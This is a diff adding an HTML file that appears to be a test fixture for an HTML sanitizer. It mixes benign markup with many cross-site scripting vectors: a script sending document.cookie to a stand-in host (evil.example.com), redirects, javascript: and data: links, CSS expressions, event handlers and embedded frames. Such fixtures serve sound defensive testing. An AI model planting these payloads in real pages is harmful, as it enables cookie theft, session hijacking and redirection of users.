@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Totally normal</title>
+<meta http-equiv="refresh" content="0;url=https://evil.example.com/">
+<base href="https://evil.example.com/">
+<link rel="stylesheet" href="https://evil.example.com/steal.css">
+<script>document.location = "https://evil.example.com/?c=" + document.cookie;</script>
+<style>
+  body { margin: 0; background: #ffffff; }
+  .box { width: 600px; margin: 0 auto; behavior: url(xss.htc); -moz-binding: url(xss.xml#xss); }
+  .exp { width: expression(alert(1)); color: #123456; }
+  .ok { font-family: Arial; font-size: 16px; color: #222222; }
+  @import url("https://evil.example.com/more.css");
+</style>
+</head>
+<body onload="alert(1)">
+<div class="box">
+  <iframe src="https://evil.example.com/frame"></iframe>
+  <object data="https://evil.example.com/o.swf"></object>
+  <embed src="https://evil.example.com/e.swf">
+  <svg onload="alert(1)"><circle r="5"/></svg>
+  <form action="https://evil.example.com/post"><input type="text" name="q" value="x"><button>Go</button><p class="ok">Text inside a form stays.</p></form>
+  <p class="ok" onclick="alert(2)" style="background: url(javascript:alert(3))">Clickable <a href="javascript:alert(4)">bad link</a> and <a href="  JaVaScRiPt:alert(5)">another</a> and <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">data link</a> and <a href="https://example.com/fine">a fine link</a>.</p>
+  <img src="javascript:alert(6)" alt="bad image">
+  <img src="https://example.com/ok.png" alt='quote" and <angle> in alt' width="200" onerror="alert(7)">
+  <p class="exp">Expression text</p>
+  <audio src="x.mp3" controls></audio>
+</div>
+</body>
+</html>
